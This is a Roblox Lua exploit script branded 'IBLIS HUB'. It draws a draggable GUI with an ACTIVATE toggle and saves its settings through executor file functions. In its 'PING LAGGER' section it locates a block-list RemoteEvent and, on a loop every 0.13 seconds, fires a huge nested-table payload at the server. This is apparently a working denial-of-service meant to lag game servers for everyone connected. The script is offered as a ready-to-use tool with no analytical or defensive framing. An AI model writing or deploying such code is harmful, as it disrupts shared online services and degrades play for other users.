-- IBLIS HUB
-- PC + Controller keybind | Auto-save

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG & SAVE
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "IBLIS_Config.json"

local LEVELS = {
    low = { delay = 0.13, name = "Low" },
}

local DEFAULT_CFG = {
    currentLevel  = "low",
}

local LAG_SETTINGS = {
    power        = 100000,
    nestingDepth = 150,
    maxReps      = 50000,
}

local cfg = {}
for k, v in pairs(DEFAULT_CFG) do
    cfg[k] = v
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end

    cfg.currentLevel = type(data.currentLevel) == "string" and LEVELS[data.currentLevel] and data.currentLevel or DEFAULT_CFG.currentLevel
end

loadConfig()

local active        = false
local remote        = nil

-- ══════════════════════════════════════════════════════════════════════
-- COLOURS - Ultra Premium
-- ══════════════════════════════════════════════════════════════════════
local C = {
    bg        = Color3.fromRGB(6, 6, 10),
    surface   = Color3.fromRGB(14, 14, 22),
    card      = Color3.fromRGB(20, 20, 30),
    border    = Color3.fromRGB(32, 32, 48),
    accent    = Color3.fromRGB(99, 102, 241),
    accent2   = Color3.fromRGB(139, 142, 255),
    white     = Color3.fromRGB(240, 240, 252),
    dim       = Color3.fromRGB(115, 115, 140),
    green     = Color3.fromRGB(52, 211, 153),
    red       = Color3.fromRGB(248, 113, 113),
    orange    = Color3.fromRGB(251, 146, 60),
    yellow    = Color3.fromRGB(250, 204, 21),
    purple    = Color3.fromRGB(167, 139, 250),
    pink      = Color3.fromRGB(244, 114, 182),
    cyan      = Color3.fromRGB(34, 211, 238),
    lime      = Color3.fromRGB(163, 230, 53),
    amber     = Color3.fromRGB(245, 158, 11),
    rose      = Color3.fromRGB(251, 113, 133),
    waiting   = Color3.fromRGB(251, 191, 36),
    inputBg   = Color3.fromRGB(10, 10, 18),
    selected  = Color3.fromRGB(30, 30, 46),
    hover     = Color3.fromRGB(40, 40, 58),
}

-- ══════════════════════════════════════════════════════════════════════
-- DESTROY OLD GUI
-- ══════════════════════════════════════════════════════════════════════
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "IblisHubGui" then kid:Destroy() end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "IblisHubGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent       = plrGui

-- ══════════════════════════════════════════════════════════════════════
-- HELPERS
-- ══════════════════════════════════════════════════════════════════════
local function tw(obj, props, t, easing)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.2, easing or Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        props):Play()
end

local function addGradient(obj, c1, c2, rot)
    local g = Instance.new("UIGradient", obj)
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, c1),
        ColorSequenceKeypoint.new(1, c2)
    })
    g.Rotation = rot or 135
    return g
end

local function makeDraggable(frame)
    local dragToggle, dragStart, startPos

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragToggle = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)

    frame.InputChanged:Connect(function(input)
        if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragToggle = false
        end
    end)
end

-- ══════════════════════════════════════════════════════════════════════
-- MAIN FRAME
-- ══════════════════════════════════════════════════════════════════════
local MAIN_W, MAIN_H = 320, 110 

local mainFrame = Instance.new("Frame")
mainFrame.Name             = "MainFrame"
mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
mainFrame.BackgroundColor3 = C.bg
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel  = 0
mainFrame.Active           = true
mainFrame.ClipsDescendants = true
mainFrame.Parent           = screen

local mainCorner = Instance.new("UICorner", mainFrame)
mainCorner.CornerRadius = UDim.new(0, 18)

-- IMAGE DE FOND
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.Name                   = "BackgroundImage"
bgImage.Size                   = UDim2.new(1, 0, 1, 0)
bgImage.Position               = UDim2.new(0, 0, 0, 0)
bgImage.BackgroundTransparency = 1
bgImage.Image                  = "rbxassetid://133146589354241"
bgImage.ScaleType              = Enum.ScaleType.Crop
bgImage.ZIndex                 = 0
Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 18)

local outerGlow = Instance.new("UIStroke", mainFrame)
outerGlow.Color        = C.border
outerGlow.Thickness    = 2
outerGlow.Transparency = 0.4
outerGlow.LineJoinMode = Enum.LineJoinMode.Round

local innerGlow = Instance.new("Frame", mainFrame)
innerGlow.Size             = UDim2.new(1, -4, 1, -4)
innerGlow.Position         = UDim2.new(0, 2, 0, 2)
innerGlow.BackgroundColor3 = Color3.fromRGB(0,0,0)
innerGlow.BackgroundTransparency = 1
innerGlow.BorderSizePixel  = 0
innerGlow.ZIndex           = 5
Instance.new("UICorner", innerGlow).CornerRadius = UDim.new(0, 16)

local innerStroke = Instance.new("UIStroke", innerGlow)
innerStroke.Color        = C.accent
innerStroke.Thickness    = 1
innerStroke.Transparency = 0.6
innerStroke.LineJoinMode = Enum.LineJoinMode.Round

makeDraggable(mainFrame)

-- ══════════════════════════════════════════════════════════════════════
-- HEADER
-- ══════════════════════════════════════════════════════════════════════
local header = Instance.new("Frame", mainFrame)
header.Size             = UDim2.new(1, 0, 0, 44)
header.BackgroundTransparency = 1 -- Rendu 100% transparent pour retirer la bande
header.BorderSizePixel  = 0
header.ZIndex           = 2
Instance.new("UICorner", header).CornerRadius = UDim.new(0, 18)

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size               = UDim2.new(1, -100, 1, 0)
titleLbl.Position           = UDim2.new(0, 16, 0, 0)   
titleLbl.BackgroundTransparency = 1
titleLbl.Text               = "IBLIS HUB"
titleLbl.TextColor3         = C.white
titleLbl.Font               = Enum.Font.GothamBlack
titleLbl.TextSize           = 13
titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
titleLbl.ZIndex             = 3

local statusPill = Instance.new("Frame", header)
statusPill.Size             = UDim2.new(0, 52, 0, 24)
statusPill.Position         = UDim2.new(1, -58, 0.5, -12)
statusPill.BackgroundColor3 = Color3.fromRGB(40, 15, 15)
statusPill.BackgroundTransparency = 0.25
statusPill.BorderSizePixel  = 0
statusPill.ZIndex           = 3
Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)

local pillBorder = Instance.new("UIStroke", statusPill)
pillBorder.Color        = C.red
pillBorder.Thickness    = 1
pillBorder.Transparency = 0.3
pillBorder.LineJoinMode = Enum.LineJoinMode.Round

local statusDot = Instance.new("Frame", statusPill)
statusDot.Size             = UDim2.new(0, 7, 0, 7)
statusDot.Position         = UDim2.new(0, 10, 0.5, -3.5)
statusDot.BackgroundColor3 = C.red
statusDot.BorderSizePixel  = 0
statusDot.ZIndex           = 4
Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size               = UDim2.new(0, 28, 1, 0)
statusLbl.Position           = UDim2.new(0, 20, 0, 0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text               = "OFF"
statusLbl.TextColor3         = C.red
statusLbl.Font               = Enum.Font.GothamBlack
statusLbl.TextSize           = 9
statusLbl.ZIndex             = 4

-- ══════════════════════════════════════════════════════════════════════
-- ACTIVATE BUTTON
-- ══════════════════════════════════════════════════════════════════════
local activateBtnContainer = Instance.new("Frame", mainFrame)
activateBtnContainer.Size             = UDim2.new(1, -20, 0, 44)
activateBtnContainer.Position         = UDim2.new(0, 10, 0, 54)
activateBtnContainer.BackgroundColor3 = Color3.fromRGB(0,0,0)
activateBtnContainer.BackgroundTransparency = 1
activateBtnContainer.BorderSizePixel  = 0
activateBtnContainer.ZIndex           = 2

local activateBtn = Instance.new("TextButton", activateBtnContainer)
activateBtn.Size             = UDim2.new(1, 0, 0, 40)
activateBtn.Position         = UDim2.new(0, 0, 0, 0)
activateBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15) -- Fond de base noir/gris très foncé
activateBtn.BorderSizePixel  = 0
activateBtn.AutoButtonColor  = false
activateBtn.Text             = ""
activateBtn.ZIndex           = 3
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 14)

-- Dégradé noir pour le bouton
local activateGrad = addGradient(activateBtn, Color3.fromRGB(35, 35, 35), Color3.fromRGB(10, 10, 10), 135)

local activateGlow = Instance.new("UIStroke", activateBtn)
activateGlow.Color        = Color3.fromRGB(100, 100, 100) -- Contour gris pour aller avec le noir
activateGlow.Thickness    = 2
activateGlow.Transparency = 0.2
activateGlow.LineJoinMode = Enum.LineJoinMode.Round

local activateShadow = Instance.new("Frame", activateBtnContainer)
activateShadow.Size             = UDim2.new(1, 0, 0, 40)
activateShadow.Position         = UDim2.new(0, 0, 0, 4)
activateShadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
activateShadow.BackgroundTransparency = 0.5
activateShadow.BorderSizePixel  = 0
activateShadow.ZIndex           = 2
Instance.new("UICorner", activateShadow).CornerRadius = UDim.new(0, 14)

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size            = UDim2.new(1, 0, 1, 0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text            = "ACTIVATE"
activateLbl.TextColor3      = C.white
activateLbl.Font            = Enum.Font.GothamBlack
activateLbl.TextSize        = 15
activateLbl.ZIndex          = 4

-- ══════════════════════════════════════════════════════════════════════
-- PING LAGGER LOGIC
-- ══════════════════════════════════════════════════════════════════════
local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, c in ipairs(rrs:GetChildren()) do
        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
    end
end

remote = findRemote()

local function buildPayload()
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, LAG_SETTINGS.nestingDepth do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(LAG_SETTINGS.power / (LAG_SETTINGS.nestingDepth + 2)), LAG_SETTINGS.maxReps)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    while active and remote do
        local delay = LEVELS[cfg.currentLevel].delay
        local payload = buildPayload()
        local ok = pcall(function() remote:FireServer(payload) end)
        task.wait(delay)
    end
end

local function flipLag(state)
    active = state
    if active then
        if not remote then
            remote = findRemote()
            if not remote then active = false; flipLag(false); return end
        end

        activateGrad:Destroy()
        addGradient(activateBtn, C.green, Color3.fromRGB(16, 185, 129), 135)
        activateLbl.Text = "ACTIVATED"
        tw(activateGlow, {Color = C.green, Transparency = 0.1}, 0.3)
        tw(activateShadow, {BackgroundColor3 = C.green}, 0.3)
        tw(outerGlow, {Color = C.green, Transparency = 0.15}, 0.3)
        tw(innerStroke, {Color = C.green, Transparency = 0.3}, 0.3)

        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(15, 40, 25)}, 0.3)
        tw(pillBorder, {Color = C.green, Transparency = 0.2}, 0.3)
        tw(statusDot, {BackgroundColor3 = C.green}, 0.3)
        statusLbl.Text = "ON"
        tw(statusLbl, {TextColor3 = C.green}, 0.3)

        task.spawn(runPingLoop)
    else
        activateGrad:Destroy()
        -- Remet le bouton en noir
        addGradient(activateBtn, Color3.fromRGB(35, 35, 35), Color3.fromRGB(10, 10, 10), 135)
        activateLbl.Text = "ACTIVATE"
        tw(activateGlow, {Color = Color3.fromRGB(100, 100, 100), Transparency = 0.2}, 0.3)
        tw(activateShadow, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.3)
        tw(outerGlow, {Color = C.border, Transparency = 0.4}, 0.3)
        tw(innerStroke, {Color = C.accent, Transparency = 0.6}, 0.3)

        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(40, 15, 15)}, 0.3)
        tw(pillBorder, {Color = C.red, Transparency = 0.3}, 0.3)
        tw(statusDot, {BackgroundColor3 = C.red}, 0.3)
        statusLbl.Text = "OFF"
        tw(statusLbl, {TextColor3 = C.red}, 0.3)
    end
end

activateBtn.MouseButton1Click:Connect(function() flipLag(not active) end)
activateBtn.MouseEnter:Connect(function()
    if not active then
        -- Effet de survol : le noir devient un peu plus gris
        tw(activateBtn, {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}, 0.2)
        tw(activateShadow, {BackgroundTransparency = 0.6}, 0.2)
    end
end)
activateBtn.MouseLeave:Connect(function()
    if not active then
        -- Retour au noir
        tw(activateBtn, {BackgroundColor3 = Color3.fromRGB(15, 15, 15)}, 0.2)
        tw(activateShadow, {BackgroundTransparency = 0.5}, 0.2)
    end
end)
